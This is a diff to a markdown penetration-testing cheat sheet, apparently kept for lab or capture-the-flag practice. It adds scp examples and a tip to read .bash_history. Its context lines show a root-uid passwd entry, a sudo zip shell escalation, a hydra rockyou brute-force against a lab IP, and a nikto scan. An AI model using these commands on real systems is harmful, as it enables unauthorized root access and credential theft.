@@ -13,9 +13,12 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 
 ## scp
 ```
+remote to local
  scp username@remote.example.com:/remote/directory/a.txt /local/directory
+ 
+ scp /local/test.txt user@remoteHost:/home/user/tmp/
 ```
-
+local to remote
 ## zip escalate
 ```
 sudo zip filename.zip filename.txt -T --unzip-command="sh -c /bin/bash"
@@ -85,6 +88,11 @@ hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.2.215 http-get /p
 ```
 nikto -h host:port
 
+```
+
+## TIPS
+```
+cat .bash_history
 ```
 
 ## useful links
